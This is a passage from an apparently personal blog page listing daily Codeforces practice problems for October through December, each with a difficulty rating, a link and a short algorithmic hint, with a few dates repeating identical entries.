mean?</td></tr></tbody></table><p>10.02</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/990/D">CF990D</a></td><td>If a graph is not connected, its complement is connected.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/803/E">CF803E</a></td><td>For each round, there are multiple status you can get to.</td></tr></tbody></table><p>10.03</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1472/E">CF1472E</a></td><td>Reduce the conditions to one.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/1131/D">CF1131D</a></td><td>Inequalities are easy to be dealt with, so process the equalities first.</td></tr></tbody></table><p>10.04</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/922/C">CF922C</a></td><td>Actually, you can find out each $n\bmod i$.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/748/E">CF748E</a></td><td>$10^7$ should be used. Find out the maximum number of students who can get at least $k$ slices for each $k$.</td></tr></tbody></table><p>10.05</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/731/C">CF731C</a></td><td>Each day provide a condition that the colors of the chosen pairs are the same.</td></tr><tr><td>2300</td><td><a href="https://codeforces.com/problemset/problem/558/D">CF558D</a></td><td>Each condition represents $1&#x2F;2$ segments in the leaves.</td></tr></tbody></table><p>10.07</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/325/B">CF325B</a></td><td>Calculate the number of games when there is $n$ players.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/865/B">CF865B</a></td><td>Use greedy approach. If you order too many pizzas, adjust your solution.</td></tr></tbody></table><p>10.08</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/1227/D2">CF1227D2</a></td><td>For each $k$ , which elements should you choose? For different $k$ -s, the change is not big.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/1482/D">CF1482D</a></td><td>You can delete the array step by step, as there are at most $n$ elements to delete.</td></tr></tbody></table><p>10.09</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1280/A">CF1280A</a></td><td>We only need to consider the first $x$ letters and the current length of the whole string.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/1320/C">CF1320C</a></td><td>For each weapon, there are only a few monsters you should consider. The choice of armor determines your profit.</td></tr></tbody></table><p>10.10</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/756/A">CF756A</a></td><td>Consider the permutation as a graph, and eventually it should consist of $1$ cycle.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/999/F">CF999F</a></td><td>Each person only need to consider one type of cards. So group the players.</td></tr></tbody></table><p>10.11</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/847/H">CF847H</a></td><td>You only need to decide where the “middle point” is.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/799/D">CF799D</a></td><td>You don’t need many kinds of operations.</td></tr></tbody></table><p>10.12</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/1082/C">CF1082C</a></td><td>Iterate over the number of students participating in each group.</td></tr><tr><td>2200</td><td><a href="https://codeforces.com/problemset/problem/809/B">CF809B</a></td><td>Find one of the answers first.</td></tr></tbody></table><p>10.14</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/257/C">CF257C</a></td><td>We just need to calculate the angle for each point.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/417/D">CF417D</a></td><td>The final cost is composed of $2$ parts: monitors and friends. You can fix the first one to find the minimum of the second part.</td></tr></tbody></table><p>10.15</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/743/D">CF743D</a></td><td>All about choosing $2$ non-intersecting subtrees. So derive it from the leaves.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/757/C">CF757C</a></td><td>Consider each $f(i)&#x3D;j$ . What’s the condition you should consider?</td></tr></tbody></table><p>10.16</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1118/E">CF1118E</a></td><td>Find a simple rule to satisfy all of the conditions.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/641/E">CF641E</a></td><td>You can consider each element and process its queries separately.</td></tr></tbody></table><p>10.17</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1009/C">CF1009C</a></td><td>Each operation can be considered separately.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/178/C3">CF178C3</a></td><td>It is all about finding the first empty place from some place $x$ .</td></tr></tbody></table><p>10.18</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/424/C">CF424C</a></td><td>You can swap the elements, combine the elements as you want and calculate the xor-value of the whole array.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/268/E">CF268E</a></td><td>Consider the order of $2$ consecutive songs.</td></tr></tbody></table><p>10.19</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/405/C">CF405C</a></td><td>List all of the elements that are calculated.</td></tr><tr><td>2200</td><td><a href="https://codeforces.com/problemset/problem/255/E">CF255E</a></td><td>Once a move is made, the number became small enough.</td></tr></tbody></table><p>10.21</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/487/A">CF487A</a></td><td>Attack and defence ability doesn’t need to change too much.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/811/C">CF811C</a></td><td>How can you check an interval is valid?</td></tr></tbody></table><p>10.22</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/238/B">CF238B</a></td><td>Find a basic answer. Can you make it better?</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/550/D">CF550D</a></td><td>If we delete the bridge, what should we construct?</td></tr></tbody></table><p>10.23</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/818/D">CF818D</a></td><td>How can you check if $x$ satisfy the condition? What’s the time complexity? How can you reduce the sum of time complexity?</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/412/D">CF412D</a></td><td>Each pair should either have a special order or be separated.</td></tr></tbody></table><p>10.24</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/305/B">CF305B</a></td><td>Each fraction has a unique corresponding continued fraction.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/195/E">CF195E</a></td><td>When you connect two points, you are merging them and updating the “depth” data.</td></tr></tbody></table><p>10.25</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/407/B">CF407B</a></td><td>When you have to go to $p_i$ , how many steps does it take to get to $i$ again.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/1005/F">CF1005F</a></td><td>Calculate the shortest path first. For each vertice, you just need to find its previous vertice to determine the edge.</td></tr></tbody></table><p>10.26</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/712/C">CF712C</a></td><td>When making the triangle smaller, it’s easy to generate an illegal triangle. So you should do it reversely.</td></tr><tr><td>2200</td><td><a href="https://codeforces.com/problemset/problem/645/E">CF645E</a></td><td>Find out the DP function first. How can you maximize it?</td></tr></tbody></table><p>10.28</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/1252/H">CF1252H</a></td><td>When considering two dimensions, it’s always easier to fix one first.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/1043/E">CF1043E</a></td><td>Do the calculation without restriction first. When should we choose the $x_i+y_j$ instead of $x_j+y_i$ ? Is there an simpler rule?</td></tr></tbody></table><p>10.29</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/358/D">CF358D</a></td><td>For each position, we only care about two things: Does the one on the left of it comes earlier? Does the one on the right of it comes earlier?</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/613/A">CF613A</a></td><td>You just need to find the minimum and the maximum distance.</td></tr></tbody></table><p>10.30</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/621/C">CF621C</a></td><td>The additivity of expectation. Then you can just calculate the probability.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/515/D">CF515D</a></td><td>Find out those positions where the direction of the tile is already determined</td></tr></tbody></table><p>10.31</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/590/A">CF590A</a></td><td>When should an element change?</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/659/F">CF659F</a></td><td>Iterate over the final non-zero number.</td></tr></tbody></table><h3 id="11月"><a href="#11月" class="headerlink" title="11月"></a>11月</h3><p>11.01</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/992/C">CF992C</a></td><td>List out the first few steps.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/295/C">CF295C</a></td><td>For each “round”, what status should you care about?</td></tr></tbody></table><p>11.02</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/1062/C">CF1062C</a></td><td>For each segment, find a optimal way to operate. Which variables determine the answer?</td></tr><tr><td>2200</td><td><a href="https://codeforces.com/problemset/problem/868/D">CF868D</a></td><td>When considering substrings of length $k$, the concatenation of strings does not generate a lot of different ones.</td></tr></tbody></table><p>11.04</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/1062/C">CF1062C</a></td><td>For each segment, find a optimal way to operate. Which variables determine the answer?</td></tr><tr><td>2200</td><td><a href="https://codeforces.com/problemset/problem/868/D">CF868D</a></td><td>When considering substrings of length $k$, the concatenation of strings does not generate a lot of different ones.</td></tr></tbody></table><p>11.05</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/1067/B">CF1067B</a></td><td>What is the most important point in this graph? Start from it.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/982/D">CF982D</a></td><td>Actually, you need to calculate the number of connected components. In what order should you merge them?</td></tr></tbody></table><p>11.06</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/575/D">CF575D</a></td><td>Try to block the thief.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/1280/C">CF1280C</a></td><td>Consider each edge. What’s its maximum &#x2F; minimum times to be calculated? Is it achievable?</td></tr></tbody></table><p>11.07</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1254/A">CF1254A</a></td><td>Find the number of <code>&#39;R&#39;</code>-s in each connected component first. How can you construct a connected component that has exactly $x$ <code>&#39;R&#39;</code>-s?</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/814/D">CF814D</a></td><td>How can you check the relation between circles? Then, make the most use of the second group.</td></tr></tbody></table><p>11.08</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/1027/C">CF1027C</a></td><td>When is $P^2&#x2F;S$ smaller?</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/587/B">CF587B</a></td><td>It is about choosing subsequence from consecutive segments.</td></tr></tbody></table><p>11.09</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/979/C">CF979C</a></td><td>You just need to rule out the “bad” routes.</td></tr><tr><td>2200</td><td><a href="https://codeforces.com/problemset/problem/1650/F">CF1650F</a></td><td>Which task should you finish first? And what options should you choose?</td></tr></tbody></table><p>11.11</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/1280/B">CF1280B</a></td><td>A classic problem to consider different cases. Find the maximum possible answer first. Which kinds of cases are easy to check?</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/846/D">CF846D</a></td><td>How can you confirm if a sub-matrix is already dead?</td></tr></tbody></table><p>11.12</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/847/E">CF847E</a></td><td>Another minimization problem. If the time is fixed, how can you check if all of the asterisks can be eaten? Note that you should let the left Packmen eat the left asterisks.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/682/D">CF682D</a></td><td>For each string, the chosen substrings separate it into a few parts.</td></tr></tbody></table><p>11.13</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1204/C">CF1204C</a></td><td>How can you check if a vertex $x$ is on the path from $u$ to $v$ ?</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/963/B">CF963B</a></td><td>Think from the leaves.</td></tr></tbody></table><p>11.14</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1580/A">CF1580A</a></td><td>Fix three sides and find a way to minimize the answer.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/164/B">CF164B</a></td><td>Having considered the $i$ -th character of $a$ , you should directly know where the $i+1$ -th character of $a$ should be in $b$ .</td></tr></tbody></table><p>11.15</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/353/C">CF353C</a></td><td>If the chosen value is already smaller, all of the lower digits should be collected.</td></tr><tr><td>2200</td><td><a href="https://codeforces.com/problemset/problem/163/C">CF163C</a></td><td>Each round of run is about choosing an interval in the conveyor.</td></tr></tbody></table><p>11.16</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/430/A">CF430A</a></td><td>“Differ by at most one”. Note that the points chosen by an interval are consecutive.</td></tr><tr><td>2200</td><td><a href="https://codeforces.com/problemset/problem/932/D">CF932D</a></td><td>How can you find the first larger predecessor quickly? Jump through the useless predecessors. Then connect the vertice with its predecessor, and you just need to calculate most steps that could be taken.</td></tr></tbody></table><p>11.18</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/610/C">CF610C</a></td><td>Try smaller $K$ -s.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/717/D">CF717D</a></td><td>How can you decide the outcome of a Nim game? How does this status change?</td></tr></tbody></table><p>11.19</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/201/B">CF201B</a></td><td>Add the cost up first. The final function consists of $2$ parts.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/372/B">CF372B</a></td><td>First of all, find all sub-rectangles that are “good”. Then, find a way to pre-process for all $(a,b,c,d)$ combinations.</td></tr></tbody></table><p>11.20</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/507/C">CF507C</a></td><td>It’s similar to a DFS. So it covers a subtree first and then the other.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/137/E">CF137E</a></td><td>Transform the string into an array. Its prefix sum is almost consecutive.</td></tr></tbody></table><p>11.21</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1068/C">CF1068C</a></td><td>Construct a base graph first. When adding an edge, what should you do to adjust it?</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/533/B">CF533B</a></td><td>Classic tree DP. Don’t forget the conditions you should satisfy to add one employee.</td></tr></tbody></table><p>11.22</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/873/C">CF873C</a></td><td>Consider each column separately.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/215/E">CF215E</a></td><td>Iterate over the number of digits.</td></tr></tbody></table><p>11.23</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/337/C">CF337C</a></td><td>Greedily arrange the correct problems. You should make the number of doubles as small as possible and as early as possible.</td></tr><tr><td>2400</td><td><a href="https://codeforces.com/problemset/problem/441/E">CF441E</a></td><td>The suffix of the original number is not changed much.</td></tr></tbody></table><p>11.25</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/700/B">CF700B</a></td><td>Consider how many times an edge should be calculated.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/566/D">CF566D</a></td><td>The key is that you should not “merge” teams twice in operation $2$ and that you should find the next position to operate effectively.</td></tr></tbody></table><p>11.26</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/174/C">CF174C</a></td><td>Adding a value to a segment is all about changing two elements in a first-order differential sequence.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/223/C">CF223C</a></td><td>Consider the weight of each element.</td></tr></tbody></table><p>11.27</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/288/C">CF288C</a></td><td>Consider each bit separately.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/1612/E">CF1612E</a></td><td>When $t$ is large, adding new elements is not profitable.</td></tr></tbody></table><p>11.28</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>*1700</td><td><a href="https://codeforces.com/problemset/problem/398/B">CF398B</a></td><td>You just care about how many rows and columns remain after operations.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/119/C">CF119C</a></td><td>Even $a_i,b_i$ is large, their difference is small, so you can always use DP.</td></tr></tbody></table><p>11.29</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/364/A">CF364A</a></td><td>Find a way to calculate the sum of the submatrix quickly.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/1387/A">CF1387A</a></td><td>Solve the problem for each connected component separately. If $x_i$ is changeable, what value should it choose?</td></tr></tbody></table><p>11.30</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/319/A">CF319A</a></td><td>After considering the largest bit, we can divide the array into two parts which are basically the same.</td></tr><tr><td>2200</td><td><a href="https://codeforces.com/problemset/problem/369/D">CF369D</a></td><td>There is a pattern that the remaining fools should follow.</td></tr></tbody></table><h3 id="12月"><a href="#12月" class="headerlink" title="12月"></a>12月</h3><p>12.02</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>*1800</td><td><a href="https://codeforces.com/problemset/problem/396/B">CF396B</a></td><td>A lot of $v(i)u(i)$ are the same. Consider them together!</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/362/C">CF362C</a></td><td>How does the swap of two elements change the total number of inversions?</td></tr></tbody></table><p>12.03</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/883/H">CF883H</a></td><td>The number of possible splits can’t be large.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/229/C">CF229C</a></td><td>Consider the basic characteristics of a triangle.</td></tr></tbody></table><p>12.04</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/297/A">CF297A</a></td><td>$0$ can be added as many as you want, but $1$ can’t.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/126/C">CF126C</a></td><td>The further one pixel is from the diagonal, the smaller number of operations it can be flipped by.</td></tr></tbody></table><p>12.05</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/698/B">CF698B</a></td><td>Process each connected component first.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/228/C">CF228C</a></td><td>When detecting a $k$ -order fractal, you can use the result of the $k-1$ -order fractal.</td></tr></tbody></table><p>12.06</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/250/C">CF250C</a></td><td>Consider the difference removing a “segment” can make.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/209/B">CF209B</a></td><td>Iterate over which pixel remains. How can the numbers of the other two change?</td></tr></tbody></table><p>12.07</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/1523/C">CF1523C</a></td><td>Find a way that can save enough room for future editions.</td></tr><tr><td>2200</td><td><a href="https://codeforces.com/problemset/problem/639/C">CF639C</a></td><td>Consider the difference you should make.</td></tr></tbody></table><p>12.09</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/185/B">CF185B</a></td><td>Transform the target function into a convex one.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/356/B">CF356B</a></td><td>Which pairs of positions can meet?</td></tr></tbody></table><p>12.10</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/234/F">CF234F</a></td><td>It’s easy to find the DP traits in the problem. Just decide what status you should include.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/257/D">CF257D</a></td><td>Start from the right.</td></tr></tbody></table><p>12.11</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1219/C">CF1219C</a></td><td>It’s all about case work.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/671/B">CF671B</a></td><td>We only care about the richest and poorest people. The numbers of their coins only increase &#x2F; decrease with time.</td></tr></tbody></table><p>12.12</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1219/C">CF1219C</a></td><td>It’s all about case work.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/671/B">CF671B</a></td><td>We only care about the richest and poorest people. The numbers of their coins only increase &#x2F; decrease with time.</td></tr></tbody></table><p>12.13</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/86/A">CF86A</a></td><td>The function is not that complex as it seems.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/542/F">CF542F</a></td><td>A knapsack problem. What is the actual size of a task?</td></tr></tbody></table><p>12.14</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/848/A">CF848A</a></td><td>Find a way to calculate the cost.</td></tr><tr><td>2200</td><td><a href="https://codeforces.com/problemset/problem/404/E">CF404E</a></td><td>There can’t be many obstacles. And once you discover the number of obstacles and the positions of them, you can greedily move them.</td></tr></tbody></table><p>12.16</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/95/B">CF95B</a></td><td>Enlarge a digit and the digits following can be whatever you want.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/331/B2">CF331B2</a></td><td>Switch the array into another one.</td></tr></tbody></table><p>12.17</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/95/B">CF95B</a></td><td>Enlarge a digit and the digits following can be whatever you want.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/331/B2">CF331B2</a></td><td>Switch the array into another one.</td></tr></tbody></table><p>12.18</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/479/D">CF479D</a></td><td>You don’t need to make a lot of marks. What are the different cases?</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/896/B">CF896B</a></td><td>Greedily thinking, you should put the small numbers from the left and large numbers from the right. Is it really correct?</td></tr></tbody></table><p>12.19</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1700</td><td><a href="https://codeforces.com/problemset/problem/1056/C">CF1056C</a></td><td>Make use of your advantage.</td></tr><tr><td>2000</td><td><a href="https://codeforces.com/problemset/problem/82/D">CF82D</a></td><td>The pattern of the queue of customers is special.</td></tr></tbody></table><p>12.20</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/297/B">CF297B</a></td><td>Find the component of each fish.</td></tr><tr><td>2100</td><td><a href="https://codeforces.com/problemset/problem/165/D">CF165D</a></td><td>All about checking if there is a white edge on the path and finding out the distance.</td></tr></tbody></table><p>12.21</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1600</td><td><a href="https://codeforces.com/problemset/problem/980/B">CF980B</a></td><td>You don’t need to actually calculate the number of shortest paths.</td></tr><tr><td>2200</td><td><a href="https://codeforces.com/problemset/problem/507/D">CF507D</a></td><td>The modulo condition starts from the suffix, so DP from the right.</td></tr></tbody></table><p>12.23</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/77/B">CF77B</a></td><td>Try drawing the area that satisfies the conditions.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/134/B">CF134B</a></td><td>If the final pair is fixed, the number of steps is fixed.</td></tr></tbody></table><p>12.24</p><table><thead><tr><th>Difficulty</th><th>Problems</th><th>Hints</th></tr></thead><tbody><tr><td>1800</td><td><a href="https://codeforces.com/problemset/problem/142/B">CF142B</a></td><td>If you can make pairs between positions, it’s easy to decide &#x2F; prove the answer.</td></tr><tr><td>1900</td><td><a href="https://codeforces.com/problemset/problem/228/E">CF228E</a></td><td>It is useless to apply operation on a single city more than 